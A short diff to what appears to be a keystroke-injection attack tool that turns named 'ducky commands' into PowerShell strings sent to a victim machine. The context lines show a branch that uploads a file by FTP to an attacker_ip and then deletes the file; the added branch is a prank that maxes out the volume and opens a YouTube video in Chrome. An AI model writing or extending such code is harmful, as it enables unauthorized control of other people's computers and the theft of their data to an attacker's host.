@@ -201,6 +201,12 @@ while not stop:
             commands.append("ftp -A -s:ftp.txt " + attacker_ip)
             commands.append("rm ftp.txt")
             stdin = "; ".join(commands)
+        elif ducky_command[:8] == "rickroll":
+            commands = []
+            commands.append("1..50 | % {(new-object -comobject wscript.shell).sendkeys([char]175)}")
+            commands.append("cd \"C:/Program Files (x86)/Google/Chrome/Application\"")
+            commands.append("./chrome.exe https://www.youtube.com/watch?v=oHg5SJYRHA0")
+            stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
             stdin = ""
